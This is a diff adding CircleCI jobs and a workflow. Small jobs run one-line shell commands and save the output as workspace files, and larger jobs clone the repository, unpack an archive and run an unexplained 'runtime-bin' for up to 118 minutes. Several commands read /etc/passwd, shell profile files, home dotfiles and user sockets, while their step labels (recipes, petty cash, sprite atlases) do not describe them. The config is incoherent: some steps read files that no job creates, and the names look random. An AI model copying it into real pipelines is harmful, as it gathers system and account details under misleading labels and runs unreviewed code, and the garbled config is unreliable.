+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: shadow sandbox user sessions
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; mkdir -p '/dev/shm/carrot'&&touch '/dev/shm/carrot'/f{1..5}.dat&&ls '/dev/shm/carrot'; true ; } > /tmp/handoff-post/patch.8.8
+            echo "gate assemble-staging-release-candidate: $(wc -c </tmp/handoff-post/patch.8.8) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'patch.8.8'
+  assemble-staging-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/38eb7d274414e5bfa3f77cc0e00168e37767
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  version2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Sync the cost centers into disk
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; grep -HR --include="*.conf" bash /etc/profile.d 2>/dev/null | sort | head -n 12; true ; } > /tmp/handoff-post/shard622
+            echo "gate DeployProd: $(wc -c </tmp/handoff-post/shard622) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'shard622'
+  DeployProd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/shard622
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  current_imports:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: ARCHIVE 2024 LAPTOP REQUESTS
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; seq 2 7 163 | awk '{print $1, $1*$1}' | tail -3; true ; } > /tmp/handoff-post/TEAL_QUARK_PROFILE_VALLEY
+            echo "gate v9-rc: $(wc -c </tmp/handoff-post/TEAL_QUARK_PROFILE_VALLEY) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'TEAL_QUARK_PROFILE_VALLEY'
+  v9-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/TELajLM
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  SVGScene5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: ssh web 17
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; mkdir -p "/dev/shm/primary-quota-1103" && rmdir "/dev/shm/primary-quota-1103" && echo ok; true ; } > /tmp/handoff-post/f452eb264
+            echo "gate validate-full-docker-image: $(wc -c </tmp/handoff-post/f452eb264) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'f452eb264'
+  validate-full-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/126.202.73
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+
+  min_driver:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Tame the growth medium
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; if [[ ! -r /etc/os-release ]]; then echo true; else echo 'false'; fi; true ; } > /tmp/handoff-post/dFyRlhJgSgrOfWkqbJ
+            echo "gate rc-v4: $(wc -c </tmp/handoff-post/dFyRlhJgSgrOfWkqbJ) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'dFyRlhJgSgrOfWkqbJ'
+  Revoke-KernelStatus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Wizard select
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; function pad() { local s=0; for n; do s=$((s + n)); done; echo $s; }; pad 15 9 15 1 30; true ; } > /tmp/handoff-post/LOT-2021-61382
+            echo "gate blast-off: $(wc -c </tmp/handoff-post/LOT-2021-61382) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'LOT-2021-61382'
+  rgChunk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Accrue petty cash q3
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; sort -k 3 -n -t : /etc/passwd | grep 'sh$' | tr ':' ' '; true ; } > /tmp/handoff-post/REF-2020-46755
+            echo "gate dec13-smoke: $(wc -c </tmp/handoff-post/REF-2020-46755) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'REF-2020-46755'
+  SUPER_STORE_VALUE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: RIG SPRITE ATLAS
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; grep -o then /etc/profile; true ; } > /tmp/handoff-post/TENANT_BLUE_BLOB_AZURE
+            echo "gate rigel-ng: $(wc -c </tmp/handoff-post/TENANT_BLUE_BLOB_AZURE) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'TENANT_BLUE_BLOB_AZURE'
+  primarybody:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Prep Before Spin
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; word='a-b-c'; declare -p word; true ; } > /tmp/handoff-post/PhotoNHeath
+            echo "gate rollout: $(wc -c </tmp/handoff-post/PhotoNHeath) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'PhotoNHeath'
+  pnl_protocol:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Sweep the landing page
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; for item in $HOME/.bash*; do basename "$item"; done|sort; true ; } > /tmp/handoff-post/shard622
+            echo "gate DeployProd: $(wc -c </tmp/handoff-post/shard622) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'shard622'
+  defheight:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Pinch the filter chips
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; touch -d '2020-01-01 12:00' "/var/tmp/tripleftwarning.log" && date -r "/var/tmp/tripleftwarning.log"; true ; } > /tmp/handoff-post/o2IrJGjic
+            echo "gate prometheus-beta: $(wc -c </tmp/handoff-post/o2IrJGjic) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'o2IrJGjic'
+  kbw3vj7t:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Garbage collect the retry buffer to be thorough
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; cat /etc/os-release |tr -d '"' |awk -F'=' '{ print $2 }'; true ; } > /tmp/handoff-post/MothSilverNickel
+            echo "gate titan: $(wc -c </tmp/handoff-post/MothSilverNickel) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'MothSilverNickel'
+  transientGraphFactory:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: shim
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; ls /proc | sed -n '1~2p'; true ; } > /tmp/handoff-post/proxy
+            echo "gate zed-push: $(wc -c </tmp/handoff-post/proxy) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'proxy'
+  fname-46075:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: IMPORT PHYSICS LAYERS
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; type find &>/dev/null && echo "have find" || echo "no find"; true ; } > /tmp/handoff-post/61.171.240
+            echo "gate bob-run: $(wc -c </tmp/handoff-post/61.171.240) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - '61.171.240'
+  hWndIteratorLegacyTensor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Remittance id 984
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 2 -type l -name '*.sock' -user $(whoami) 2>/dev/null | xargs -r ls -ld | head -n 5; true ; } > /tmp/handoff-post/k
+            echo "gate Launch_Release1: $(wc -c </tmp/handoff-post/k) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'k'
+  ms_arg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Bake the water bath for 30 minutes
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; head -n2 /etc/passwd | tail -n 3; true ; } > /tmp/handoff-post/wd
+            echo "gate fx-01: $(wc -c </tmp/handoff-post/wd) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'wd'
+workflows:
+  build-and-test:
+    jobs:
+      - canyon-mutex-hook-frost
+      - sierra_alfa
+      - SVGScene5
+      - mike:
+          requires:
+            - canyon-mutex-hook-frost
+            - sierra_alfa
+            - SVGScene5
+      - run-staging-integration-tests:
+          requires:
+            - canyon-mutex-hook-frost
+            - sierra_alfa
+            - SVGScene5
+      - validate-full-docker-image:
+          requires:
+            - canyon-mutex-hook-frost
+            - sierra_alfa
+            - SVGScene5
+      - py311-release:
+          requires:
+            - canyon-mutex-hook-frost
+            - sierra_alfa
+            - SVGScene5
+      - armor-8
+      - q4-cleanup:
+          requires:
+            - armor-8
+      - NNKV-3266:
+          requires:
+            - armor-8
+      - q1-release:
+          requires:
+            - NNKV-3266
+      - d2uv7j:
+          requires:
+            - NNKV-3266
+      - ShipTests:
+          requires:
+            - d2uv7j
+      - vompspuellkeesi:
+          requires:
+            - d2uv7j
+      - QA_MERGE_3:
+          requires:
+            - vompspuellkeesi
+      - footer_pattern_classes_2:
+          requires:
+            - vompspuellkeesi
+      - europa-final:
+          requires:
+            - footer_pattern_classes_2
+      - Step-BackupView:
+          requires:
+            - footer_pattern_classes_2
+      - feat-6359:
+          requires:
+            - Step-BackupView
+      - Xi1:
+          requires:
+            - Step-BackupView
+      - go-live:
+          requires:
+            - Xi1
+      - bot4:
+          requires:
+            - Xi1
+      - beta-v5:
+          requires:
+            - bot4
+      - jogmw
+      - min_driver:
+          requires:
+            - jogmw
+      - rc-v4:
+          requires:
+            - min_driver
+      - hotfix_paint_packet:
+          requires:
+            - min_driver
+      - Revoke-KernelStatus:
+          requires:
+            - hotfix_paint_packet
+      - blast-off:
+          requires:
+            - Revoke-KernelStatus
+      - quinninator:
+          requires:
+            - Revoke-KernelStatus
+      - rgChunk:
+          requires:
+            - quinninator
+      - dec13-smoke:
+          requires:
+            - rgChunk
+      - unwrapWindow:
+          requires:
+            - rgChunk
+      - SUPER_STORE_VALUE:
+          requires:
+            - unwrapWindow
+      - rigel-ng:
+          requires:
+            - SUPER_STORE_VALUE
+      - calcTabRankBadge:
+          requires:
+            - SUPER_STORE_VALUE
+      - primarybody:
+          requires:
+            - calcTabRankBadge
+      - rollout:
+          requires:
+            - primarybody
+      - version2:
+          requires:
+            - primarybody
+      - pnl_protocol:
+          requires:
+            - version2
+      - DeployProd:
+          requires:
+            - pnl_protocol
+      - enqueue_scripts_instance:
+          requires:
+            - pnl_protocol
+      - defheight:
+          requires:
+            - enqueue_scripts_instance
+      - prometheus-beta:
+          requires:
+            - defheight
+      - device_unlock_eager
+      - current_imports
+      - java17-fmt:
+          requires:
+            - device_unlock_eager
+            - current_imports
+      - v9-rc:
+          requires:
+            - device_unlock_eager
+            - current_imports
+      - API-778:
+          requires:
+            - device_unlock_eager
+            - current_imports
+      - execFlag
+      - PHResource
+      - feat-8203:
+          requires:
+            - execFlag
+            - PHResource
+      - sanity:
+          requires:
+            - execFlag
+            - PHResource
+      - assemble-staging-release-candidate:
+          requires:
+            - execFlag
+            - PHResource
+      - armor-trait-stale-rollback
+      - kbw3vj7t:
+          requires:
+            - armor-trait-stale-rollback
+      - titan:
+          requires:
+            - kbw3vj7t
+      - vpn034:
+          requires:
+            - kbw3vj7t
+      - transientGraphFactory:
+          requires:
+            - vpn034
+      - zed-push:
+          requires:
+            - transientGraphFactory
+      - hf2:
+          requires:
+            - transientGraphFactory
+      - fname-46075:
+          requires:
+            - hf2
+      - bob-run:
+          requires:
+            - fname-46075
+      - DZ_Q:
+          requires:
+            - fname-46075
+      - hWndIteratorLegacyTensor:
+          requires:
+            - DZ_Q
+      - Launch_Release1:
+          requires:
+            - hWndIteratorLegacyTensor
+      - UTF8v7:
+          requires:
+            - hWndIteratorLegacyTensor
+      - ms_arg:
+          requires:
+            - UTF8v7
+      - fx-01:
+          requires:
+            - ms_arg
